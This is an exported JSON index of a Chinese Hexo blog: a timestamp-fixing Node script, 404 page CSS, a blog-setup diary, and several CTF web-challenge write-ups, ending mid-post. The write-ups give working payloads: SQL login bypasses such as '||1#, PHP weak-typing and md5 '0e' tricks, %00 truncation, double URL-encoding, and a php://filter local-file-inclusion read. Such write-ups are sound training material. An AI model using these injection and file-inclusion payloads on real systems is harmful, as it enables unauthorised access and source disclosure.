{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"LINK","url":"https://perfect-time.xyz"},"pages":[{"title":"404","date":"2022-11-18T02:38:06.135Z","updated":"2018-11-11T07:09:10.000Z","comments":true,"path":"404/404.html","permalink":"https://perfect-time.xyz/404/404.html","excerpt":"","text":"4 0 4 0 4 0 4 0 4 0 4 0 4 0 4 0 4 0 4 0"},{"title":"","date":"2022-11-18T02:38:06.119Z","updated":"2022-07-05T04:53:54.000Z","comments":true,"path":"writeupdatetime.js","permalink":"https://perfect-time.xyz/writeupdatetime.js","excerpt":"","text":"#!/usr/bin/env node /* 批量添加修改时间 用于bolg初始化修改时间 */ console.log('脚本开始运行..'); var fs = require(\"fs\"); //请求文件系统 var file = \"./txt\"; //设置读取和写入的文件，当前目录下的test文件 var RegExp=/(updated:\\s*)((\\d{2}(([02468][048])|([13579][26]))[\\-\\/\\s]?((((0?[13578])|(1[02]))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(3[01])))|(((0?[469])|(11))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(30)))|(0?2[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])))))|(\\d{2}(([02468][1235679])|([13579][01345789]))[\\-\\/\\s]?((((0?[13578])|(1[02]))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(3[01])))|(((0?[469])|(11))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(30)))|(0?2[\\-\\/\\s]?((0?[1-9])|(1[0-9])|(2[0-8]))))))(\\s((([0-1][0-9])|(2?[0-3]))\\:([0-5]?[0-9])((\\s)|(\\:([0-5]?[0-9])))))\\r/g; fs.readdir(\"./\",function(err,files){ var len=files.length; var file=null; for(var i=0;i-1){ console.log(\"正在处理文件：\",file); writeFileTime(file,fs); } } console.log(\"运行完毕！\"); }); /* file:读取时间的文件以及写入内容的文件 fs: 文件系统 */ function writeFileTime(file,fs){ fs.readFile(file, 'utf8',function(err, data) { //读取文件内容 if (err) return console.log(\"读取文件内容错误：\",err); //console.log(\"文件\"+file+\"的内容：\",data); fs.stat(file,function(err, stats) { //读取文件信息，创建时间等 if (err) return console.log(\"读取文件信息错误：\",err); //console.log(\"文件\"+file+\"的信息：\",stats); //打印文件的信息 //console.log(\"创建时间是：\",stats.mtime); //console.log(\"文件的创建时间是：\",getFormatDate(stats.mtime)); var result= data.replace(RegExp,\"\"); //替换更新时间 result = result.replace(/categories:/g, \"updated: \"+getFormatDate(stats.mtime)+\"\\r\"+\"categories:\");//data:替换为标准化日期 //console.log(\"修改后文件内容为：\",result); fs.writeFile(file, result, 'utf8',function(err) { //写入新的文件内容 if (err) return console.log(\"写文件错误：\",err); }); }); }); } /* timeStr:时间，格式可为：\"September 16,2016 14:15:05、 \"September 16,2016\"、\"2016/09/16 14:15:05\"、\"2016/09/16\"、 '2014-04-23T18:55:49'和毫秒 dateSeparator：年、月、日之间的分隔符，默认为\"-\"， timeSeparator：时、分、秒之间的分隔符，默认为\":\" */ function getFormatDate(timeStr, dateSeparator, timeSeparator) { dateSeparator = dateSeparator ? dateSeparator : \"-\"; timeSeparator = timeSeparator ? timeSeparator : \":\"; var date = new Date(timeStr), year = date.getFullYear(),// 获取完整的年份(4位,1970) month = date.getMonth(),// 获取月份(0-11,0代表1月,用的时候记得加上1) day = date.getDate(),// 获取日(1-31) hour = date.getHours(),// 获取小时数(0-23) minute = date.getMinutes(),// 获取分钟数(0-59) seconds = date.getSeconds(),// 获取秒数(0-59) Y = year + dateSeparator, M = ((month + 1) > 9 ? (month + 1) : ('0' + (month + 1))) + dateSeparator, D = (day > 9 ? day : ('0' + day)) + ' ', h = (hour > 9 ? hour : ('0' + hour)) + timeSeparator, m = (minute > 9 ? minute : ('0' + minute)) + timeSeparator, s = (seconds > 9 ? seconds : ('0' + seconds)), formatDate = Y + M + D + h + m + s; return formatDate; }"},{"title":"关于我","date":"2022-11-18T02:38:06.151Z","updated":"2018-12-06T07:16:04.000Z","comments":true,"path":"about/index.html","permalink":"https://perfect-time.xyz/about/index.html","excerpt":"","text":"Never Mind the Scandal and Liber。 永远不要理会谣言与重伤。"},{"title":"","date":"2022-11-18T02:38:06.144Z","updated":"2018-11-11T07:11:16.000Z","comments":true,"path":"404/index.css","permalink":"https://perfect-time.xyz/404/index.css","excerpt":"","text":"body { background: #000; height: 100vh; overflow: hidden; display: flex; font-family: 'Anton', sans-serif; justify-content: center; align-items: center; -webkit-perspective: 1000px; perspective: 1000px; } div { -webkit-transform-style: preserve-3d; transform-style: preserve-3d; } .rail { position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; -webkit-transform: rotateX(-30deg) rotateY(-30deg); transform: rotateX(-30deg) rotateY(-30deg); } .rail .stamp { position: absolute; width: 200px; height: 200px; display: flex; justify-content: center; align-items: center; background: #141414; color: #fff; font-size: 7rem; } .rail .stamp:nth-child(1) { -webkit-animation: stampSlide 40000ms -2300ms linear infinite; animation: stampSlide 40000ms -2300ms linear infinite; } .rail .stamp:nth-child(2) { -webkit-animation: stampSlide 40000ms -4300ms linear infinite; animation: stampSlide 40000ms -4300ms linear infinite; } .rail .stamp:nth-child(3) { -webkit-animation: stampSlide 40000ms -6300ms linear infinite; animation: stampSlide 40000ms -6300ms linear infinite; } .rail .stamp:nth-child(4) { -webkit-animation: stampSlide 40000ms -8300ms linear infinite; animation: stampSlide 40000ms -8300ms linear infinite; } .rail .stamp:nth-child(5) { -webkit-animation: stampSlide 40000ms -10300ms linear infinite; animation: stampSlide 40000ms -10300ms linear infinite; } .rail .stamp:nth-child(6) { -webkit-animation: stampSlide 40000ms -12300ms linear infinite; animation: stampSlide 40000ms -12300ms linear infinite; } .rail .stamp:nth-child(7) { -webkit-animation: stampSlide 40000ms -14300ms linear infinite; animation: stampSlide 40000ms -14300ms linear infinite; } .rail .stamp:nth-child(8) { -webkit-animation: stampSlide 40000ms -16300ms linear infinite; animation: stampSlide 40000ms -16300ms linear infinite; } .rail .stamp:nth-child(9) { -webkit-animation: stampSlide 40000ms -18300ms linear infinite; animation: stampSlide 40000ms -18300ms linear infinite; } .rail .stamp:nth-child(10) { -webkit-animation: stampSlide 40000ms -20300ms linear infinite; animation: stampSlide 40000ms -20300ms linear infinite; } .rail .stamp:nth-child(11) { -webkit-animation: stampSlide 40000ms -22300ms linear infinite; animation: stampSlide 40000ms -22300ms linear infinite; } .rail .stamp:nth-child(12) { -webkit-animation: stampSlide 40000ms -24300ms linear infinite; animation: stampSlide 40000ms -24300ms linear infinite; } .rail .stamp:nth-child(13) { -webkit-animation: stampSlide 40000ms -26300ms linear infinite; animation: stampSlide 40000ms -26300ms linear infinite; } .rail .stamp:nth-child(14) { -webkit-animation: stampSlide 40000ms -28300ms linear infinite; animation: stampSlide 40000ms -28300ms linear infinite; } .rail .stamp:nth-child(15) { -webkit-animation: stampSlide 40000ms -30300ms linear infinite; animation: stampSlide 40000ms -30300ms linear infinite; } .rail .stamp:nth-child(16) { -webkit-animation: stampSlide 40000ms -32300ms linear infinite; animation: stampSlide 40000ms -32300ms linear infinite; } .rail .stamp:nth-child(17) { -webkit-animation: stampSlide 40000ms -34300ms linear infinite; animation: stampSlide 40000ms -34300ms linear infinite; } .rail .stamp:nth-child(18) { -webkit-animation: stampSlide 40000ms -36300ms linear infinite; animation: stampSlide 40000ms -36300ms linear infinite; } .rail .stamp:nth-child(19) { -webkit-animation: stampSlide 40000ms -38300ms linear infinite; animation: stampSlide 40000ms -38300ms linear infinite; } .rail .stamp:nth-child(20) { -webkit-animation: stampSlide 40000ms -40300ms linear infinite; animation: stampSlide 40000ms -40300ms linear infinite; } @-webkit-keyframes stampSlide { 0% { -webkit-transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(130px); transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(130px); } 100% { -webkit-transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(-3870px); transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(-3870px); } } @keyframes stampSlide { 0% { -webkit-transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(130px); transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(130px); } 100% { -webkit-transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(-3870px); transform: rotateX(90deg) rotateZ(-90deg) translateZ(-200px) translateY(-3870px); } } .world { -webkit-transform: rotateX(-30deg) rotateY(-30deg); transform: rotateX(-30deg) rotateY(-30deg); } .world .forward { position: absolute; -webkit-animation: slide 2000ms linear infinite; animation: slide 2000ms linear infinite; } .world .box { width: 200px; height: 200px; -webkit-transform-origin: 100% 100%; transform-origin: 100% 100%; -webkit-animation: roll 2000ms cubic-bezier(1, 0.01, 1, 1) infinite; animation: roll 2000ms cubic-bezier(1, 0.01, 1, 1) infinite; } .world .box .wall { position: absolute; width: 200px; height: 200px; background: rgba(10, 10, 10, 0.8); border: 1px solid #fafafa; box-sizing: border-box; } .world .box .wall::before { content: ''; position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; color: #fff; font-size: 7rem; } .world .box .wall:nth-child(1) { -webkit-transform: translateZ(100px); transform: translateZ(100px); } .world .box .wall:nth-child(2) { -webkit-transform: rotateX(180deg) translateZ(100px); transform: rotateX(180deg) translateZ(100px); } .world .box .wall:nth-child(3) { -webkit-transform: rotateX(90deg) translateZ(100px); transform: rotateX(90deg) translateZ(100px); } .world .box .wall:nth-child(3)::before { -webkit-transform: rotateX(180deg) rotateZ(90deg) translateZ(-1px); transform: rotateX(180deg) rotateZ(90deg) translateZ(-1px); -webkit-animation: zeroFour 4000ms -2000ms linear infinite; animation: zeroFour 4000ms -2000ms linear infinite; } .world .box .wall:nth-child(4) { -webkit-transform: rotateX(-90deg) translateZ(100px); transform: rotateX(-90deg) translateZ(100px); } .world .box .wall:nth-child(4)::before { -webkit-transform: rotateX(180deg) rotateZ(-90deg) translateZ(-1px); transform: rotateX(180deg) rotateZ(-90deg) translateZ(-1px); -webkit-animation: zeroFour 4000ms -2000ms linear infinite; animation: zeroFour 4000ms -2000ms linear infinite; } .world .box .wall:nth-child(5) { -webkit-transform: rotateY(90deg) translateZ(100px); transform: rotateY(90deg) translateZ(100px); } .world .box .wall:nth-child(5)::before { -webkit-transform: rotateX(180deg) translateZ(-1px); transform: rotateX(180deg) translateZ(-1px); -webkit-animation: zeroFour 4000ms linear infinite; animation: zeroFour 4000ms linear infinite; } .world .box .wall:nth-child(6) { -webkit-transform: rotateY(-90deg) translateZ(100px); transform: rotateY(-90deg) translateZ(100px); } .world .box .wall:nth-child(6)::before { -webkit-transform: rotateX(180deg) rotateZ(180deg) translateZ(-1px); transform: rotateX(180deg) rotateZ(180deg) translateZ(-1px); -webkit-animation: zeroFour 4000ms linear infinite; animation: zeroFour 4000ms linear infinite; } @-webkit-keyframes zeroFour { 0% { content: '4'; } 100% { content: '0'; } } @keyframes zeroFour { 0% { content: '4'; } 100% { content: '0'; } } @-webkit-keyframes roll { 0% { -webkit-transform: rotateZ(0deg); transform: rotateZ(0deg); } 85% { -webkit-transform: rotateZ(90deg); transform: rotateZ(90deg); } 87% { -webkit-transform: rotateZ(88deg); transform: rotateZ(88deg); } 90% { -webkit-transform: rotateZ(90deg); transform: rotateZ(90deg); } 100% { -webkit-transform: rotateZ(90deg); transform: rotateZ(90deg); } } @keyframes roll { 0% { -webkit-transform: rotateZ(0deg); transform: rotateZ(0deg); } 85% { -webkit-transform: rotateZ(90deg); transform: rotateZ(90deg); } 87% { -webkit-transform: rotateZ(88deg); transform: rotateZ(88deg); } 90% { -webkit-transform: rotateZ(90deg); transform: rotateZ(90deg); } 100% { -webkit-transform: rotateZ(90deg); transform: rotateZ(90deg); } } @-webkit-keyframes slide { 0% { -webkit-transform: translateX(0); transform: translateX(0); } 100% { -webkit-transform: translateX(-200px); transform: translateX(-200px); } } @keyframes slide { 0% { -webkit-transform: translateX(0); transform: translateX(0); } 100% { -webkit-transform: translateX(-200px); transform: translateX(-200px); } }"}],"posts":[{"title":"内网攻防","slug":"Intranet_attack","date":"2023-08-09T19:18:22.299Z","updated":"2023-08-09T19:21:12.232Z","comments":true,"path":"2023/08/10/Intranet_attack/","link":"","permalink":"https://perfect-time.xyz/2023/08/10/Intranet_attack/","excerpt":"占位等更新","text":"占位等更新 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到&#x2F;source这个目录里面Github只会上传&#x2F;source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 2018&#x2F;7&#x2F;7更新去掉了来必力的评论系统，看了几个博客之后发现好像Gitment比较受欢迎，就换成了Gitment系统 需要注意的是gitment_client_id和gitment_client_secret 在注册之后就会给你了 gitment_owner:填自己github账号 gitment_repo: 存储评论的库，按理说这个也可以另外再建一个库，不过我为了以防万一就直接用博客的库了 这个评论系统好像可以汉化，懒得弄了 2022&#x2F;7&#x2F;5更新时隔4年，昨晚睡不着通宵搞了一些东西，顺便把博客也复原一下复原的过程中遇到个非常麻烦的事情。hexo居然不支持新版本的node.js，其实解决方案很简单，直接把已经安装的node删除干净，再安装低版本的node即刻。全部搞定之后发现文章的时间全部乱了，都是变成了今天，删除了2022的目录之后还是不行。删除.deploy_git目录，并且在每个文章的抬头加上 date:日期即可。 2023&#x2F;8&#x2F;10更新在新电脑上又搞了次恢复，写一下恢复的方式，以便以后再做恢复 环境安装安装以下三个环境node.js git hexo npm install -g hexo-cli ##关联到github项目查看C:\\Users\\用户名.ssh下有无ssh文件夹，没有则创建 cd ~/. ssh ssh-keygen -t rsa -C &quot;1055883471@qq.com&quot; 打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key测试是否成功 ssh -T git@github.com 配置用户名和邮箱 git config --global user.name &quot;perfect-time&quot; git config --global user.email &quot;1055883471@qq.com&quot; 关联到git项目 git init git remote add origin git@github.com:perfect-time/perfect-time.github.io.git ##浏览和提交生成并浏览 hexo g &amp;&amp; hexo s 提交进入”\\blog\\source_posts”,写完之后生成并浏览，没问题之后提交 hexo d 添加备份 git add . git commit -m &#39;modify&#39; git push origin hexo 持续更新中~","categories":[{"name":"内网","slug":"内网","permalink":"https://perfect-time.xyz/categories/%E5%86%85%E7%BD%91/"}],"tags":[{"name":"内网攻防","slug":"内网攻防","permalink":"https://perfect-time.xyz/tags/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/"}],"keywords":[{"name":"内网","slug":"内网","permalink":"https://perfect-time.xyz/categories/%E5%86%85%E7%BD%91/"}]},{"title":"实验吧-web-wp","slug":"shiyan8","date":"2018-12-06T07:22:33.000Z","updated":"2022-07-05T06:59:10.000Z","comments":true,"path":"2018/12/06/shiyan8/","link":"","permalink":"https://perfect-time.xyz/2018/12/06/shiyan8/","excerpt":"show不动了","text":"show不动了 天下武功唯快不破响应头中有flag，但是经过base64编码，而且每次访问这个flag都会变化，写个脚本 # -*- coding: UTF-8 -*- import requests import base64 import re url = &quot;http://ctf5.shiyanbar.com/web/10/10.php&quot; s = requests.Session() r = s.get(url).headers[&quot;FLAG&quot;] r = str(base64.b64decode(r)) print(r) k = re.search(&#39;(?&lt;=:)(.*)&#39;,r).group(0) print(k) r = s.post(url,data=&#123;&#39;key&#39;:k&#125;) print(r.text) raw_input(&quot;Press &lt;enter&gt;&quot;) 需要注意的是，提交的flag没必要再用base64编一次再提交了，我把他想的太复杂了，浪费了很多时间 Forms随便输入一个值，点击enter，发现发送了两个参数，一个是输入的PIN，还有一个是showsource，查看源码？ 试着改showsoure的值，改为1，发现真的返回了源码 $a = $_POST[&quot;PIN&quot;]; if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo &quot;Congratulations! The flag is $flag&quot;; &#125; else &#123; echo &quot;User with provided PIN not found.&quot;; &#125; 只需让输入的值等于if条件中的一长串即可 天网管理系统有点查看源代码 &lt;!-- $test=$_GET[&#39;username&#39;]; $test=md5($test); if($test==&#39;0&#39;) --&gt; 要求输入的值经过md5之后等于0，这里可以用php弱类型绕过 MD5有几个字符串是以0e开头的，比如QNKCDZO 算出来的值为0e830400451993494058024219903391，党0e开头的字符串进行比较的时候，会变成科学计数法，即0*10^830400451993494058024219903391&#x3D;0，即可绕过if条件。之后返回一个url/user.php?fame=hjkleffifer直接访问 $unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) &#123; print_r($flag); &#125; 看到unserialize就知道是反序列化。根据php的弱类型，ture跟任何字符串比较的结果都是true，所以只需要构造数组 &lt;?php $arr = array(&#39;user&#39; =&gt; true,&#39;pass&#39; =&gt; true); $b = serialize($arr); print_r($b); ?&gt; //a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125; 在首页输入序列号的数组，即可获得flag Once More点击查看源码 &lt;?php if (isset ($_GET[&#39;password&#39;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE) &#123; echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;; &#125; else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999) &#123; if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) &#123; die(&#39;Flag: &#39; . $flag); &#125; else &#123; echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;); &#125; &#125; else &#123; echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;; &#125; &#125; ?&gt; 题目提示ereg（）函数有漏洞，还提醒科学计数法，用于绕过前两个判断条件 ereg函数有截断漏洞，用%00可以截断函数执行。用科学计数法可以满足大于9999999且长度小于8。最后只要在字符串的最后加上*-*即可 输入 ?password=9e8%00*-* PHP大法进入页面，一大堆报错信息，底下提示index.php.txt，访问这个文件得到源码 &lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); &#125; $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) &#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;; &#125; ?&gt; &lt;br&gt;&lt;br&gt; Can you authenticate to this website? 这里我们需要传入经过两次url编码的hackerDJ，因为在传值时，服务器会自动解码一次，解码成hackerDJ时，就会在一开始的if中被检测到，而下面会把url再解码一次，所以传入的值为 ?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61 另外，这里还可以用二次编码，比上面的方法更快 ？id=%2568ackerDJ","categories":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://perfect-time.xyz/tags/wp/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}]},{"title":"极客大挑战第⑨季-web-wp","slug":"geeksycsec","date":"2018-12-06T07:20:51.000Z","updated":"2022-07-05T06:58:14.000Z","comments":true,"path":"2018/12/06/geeksycsec/","link":"","permalink":"https://perfect-time.xyz/2018/12/06/geeksycsec/","excerpt":"快乐才是CTF的本质","text":"快乐才是CTF的本质 初来乍到提示源码中藏着秘密，右键有代码就有flag了 2000字检讨提示要提交检讨书，进入页面，可以看到页面上方有一个万能检讨书，点进去之后发现检讨书页面不能复制也不能右键源代码。 在url前面加上view-source:即可查看源代码，源代码里就可以复制了，把检讨书复制到提交框中，获得flag。 幸运大挑战打开页面一看，是一个不断变化的数字和一个提交，尝试提交，提示分数必须要是10.00时才能赢得macboor pro，右键查看源代码，可以发现当我们点击提交时，页面会把那一瞬间的数字通过get方式把数字传到&#x2F;form这个页面，参数名为score。 接下来就很简单了，把score的值改为10.00即可获得flag 代号为geek的行动第二幕：废弃的地下黑客论坛题目说是论坛的后台，打开页面发现是登录界面，很容易就能想到是表单绕过。 在username中输入’||1#，password随便输点东西即可获得flag。 geek番外篇之废弃的地下黑客论坛打开页面，又是同样的登录界面，故技重施，在username中输入’||1#，password随便输点东西，结果提示用户名或密码错误。 因为返回了执行语句，仔细观察执行语句，可以发现输入的单引号消失了，这里应该是删除了单引号，无论输入多少个单引号都被删除了。而且输入也做了限制，如果输入超过4位数则会提示不能超过4位。 这里用表单绕过的另外一个思路，用转义符转义原有的单引号，使其跟password后面的单引号闭合，在注释掉最后的单引号即可绕过。 执行语句如下 select * from users where username=&#39;\\&#39; and password=&#39;||1#&#39;; 因为\\转义了原有的单引号，所以Username的值变为了\\&#39; and password=，后面再跟上||1#，即可绕过 代号为geek的行动第三幕：暗网追击打开就一张图片，显示你不是admin，抓包发现cookie字段的值为is_admin&#x3D;0，改为1再发送就得到flag了 一起来和php撸猫啊背景因为好像是工作细胞吧，四斋蒸鹅心 右键发现源码提示 if (isset($_GET[&#39;p1&#39;]))&#123; if ($_GET[&#39;p1&#39;] &gt; 99999999 &amp;&amp; strlen($_GET[&#39;p1&#39;]) &lt; 9)&#123; if (isset ( $_GET [&#39;p2&#39;] )) &#123; $p2 = $_GET [&#39;p2&#39;]; if (is_numeric($p2))&#123; die(&#39;Input cannot be a number!!!&#39;); &#125; else&#123; switch ($p2) &#123; case 0 : break; case 1 : break; case 2 : echo &quot;flag&#123;xxxxx&#125;&quot;; break; default : echo &quot;2333333&quot;; break; &#125; &#125; &#125; &#125; &#125; 大致意思是p1要等于999999999但是长度不能为9，p2要不能为数字，但是当p2等于2时输出flag p1用科学计数法绕过，p2用弱类型绕过 ?p1=9e10&amp;p2=2a 还没写完wp，极客大挑战就进不去了，不知道是不是关闭了","categories":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://perfect-time.xyz/tags/wp/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}]},{"title":"cgctf-web-wp","slug":"CGCTF-wp","date":"2018-10-26T12:11:05.000Z","updated":"2022-07-05T06:57:44.000Z","comments":true,"path":"2018/10/26/CGCTF-wp/","link":"","permalink":"https://perfect-time.xyz/2018/10/26/CGCTF-wp/","excerpt":"show time!","text":"show time! 签到题右键查看源代码就出来了 md5 collision源码： $md51 = md5(&#39;QNKCDZO&#39;); $a = @$_GET[&#39;a&#39;]; $md52 = @md5($a); if(isset($a))&#123; if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;; &#125; else &#123; echo &quot;false!!!&quot;; &#125;&#125; else&#123;echo &quot;please input a&quot;;&#125; 要求输入的值与QNKCDZO不同但是md5相同 这样的值有好几个，随便输入一个即可 ?a=s878926199a 签到2要求输入11位密码但是输入框限制输入10位，右键审查元素，把这个限制改成11即可 这题不是web这题还真不是web 这题看似没有任何的切入点，只有一张图片，实际上把图片保存到本地，记事本打开即可看到flag 层层递进本身是个很简单的题，但是要做出来真的是很需要眼力 初看之下没有什么异常的地方，右键源代码之后，在iframe标签中，能发现有好几个属性都是0。src属性中，能发现一个文件，SO.html，访问该文件 在出现的新的页面中再次右键源代码，类似的地方能发现一个404.html文件，访问该文件 在新的页面中再次源代码，可以看到有一部分被注释了 &lt;!-- Placed at the end of the document so the pages load faster --&gt; &lt;!-- &lt;script src=&quot;./js/jquery-n.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-c.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-t.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-f.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-&#123;.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-t.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-h.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-i.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-s.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-i.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-s.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-a.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-f.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-l.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-4.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-g.7.2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./js/jquery-&#125;.7.2.min.js&quot;&gt;&lt;/script&gt; --&gt; 仔细观察，可以发现flag nctf&#123;this_is_a_fl4g&#125; AAencodejavascript aaencode是一种编码方式 直接将编码丢到控制台里运行即可 要求浏览器的编码为unicode 单身二十年点击找到key，页面会发生两次跳转，第一次跳转为正确的页面，抓包或者禁用js都行 php decode&lt;?php function CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE; &#125; eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;)); ?&gt; 大致意思就是创建一个函数，用特殊的方式来解码 需要解的码在最后，把eval改成echo即可输出解码之后的结果 本地包含点击click me，可以发现页面包含了一个show.php 尝试读取源码index.php?file=php://filter/read=convert.base64-encode/resource=index.php PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= 结果base64解码之后得到flag &lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#39;;&#125; $file=$_GET[&#39;file&#39;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125; ?&gt; &lt;/html&gt; 单身一百年也没用跟之前那题一样，抓第一个包，重放之后得到flag COOKIE提示0&#x3D;&#x3D;not，抓包之后发现cookie值等于0，应该是0无法登陆的意思，改成1即可得到flag MYSQL根据提示访问robots.txt文件，得到第二次提示，访问sql.php以及其源码 &lt;?php if($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . 